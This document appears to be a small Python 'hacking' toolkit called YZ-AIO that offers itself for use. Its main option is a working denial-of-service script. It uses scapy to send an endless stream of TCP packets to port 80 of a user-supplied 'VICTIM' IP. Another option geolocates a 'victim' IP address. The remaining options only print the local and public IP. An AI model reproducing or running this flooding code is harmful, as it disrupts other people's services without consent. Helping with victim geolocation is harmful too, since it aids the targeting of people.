import os
print("YZ-AIO")
print("YOU WILL FIND HERE ALL TOOLS YOU WILL NEED FOR HACKING")
print("SOON I WILL ADD MORE")
print(":)")
print ("1 for DOS")
print ("2 for get ip geo location")
print("3 to know your localhost ip address  ")
print("4 to know your public ip address ")
x = input(">>> choose number : ")
if x == ("1") :
  import scapy
  from scapy.all import *
  print ("YZ-AIO (DOS)")
  x = input("enter {YOUR} ip address : ")
  y = input("enter VICTIM ip address : ")
  i =10
  while True :
    for source_port in range(1, 5000):
     IP1 = IP(src=x, dst=y)
     TCP1 = TCP(sport=source_port , dport=80)
     packet = IP1 / TCP1
     send(packet, inter=.001)
     print("Attacking...Packet number" , i)
     i += 10
if x == ("2") :
  print("YZ-AIO (IP ----> GEO)")
  from ip2geotools.databases.noncommercial import DbIpCity
  xx = input("Enter victim ip : ")
  response = DbIpCity.get(xx, api_key="free")
  print("\n")
  print(" Region : " + format(response.country))
  print("\n")
  print("-------------------")
  print("City : " + format(response.city))
  print("google map statics : " + format(response.longitude)) 
  print("" +  format(response.latitude))
  print("Finish ! thanks for choosing this tool :)")
  print("re open tool to chose another items")
if x == ("3") :
  print("YZ-AIO (WHAT IS MY localhost IP?)")
  import socket
  hostname = socket.gethostname()
  yy = socket.gethostbyname(hostname)
  print ("Your localhost ip address : " + yy)
  print ("thx for using my tool :)")
  
if x == ("4") :
  import urllib.request
  yyy = urllib.request.urlopen("https://ident.me").read().decode("utf8")
  print ("Your  public ip address is : " + yyy)
  print ("thx for choosing my tool :)")
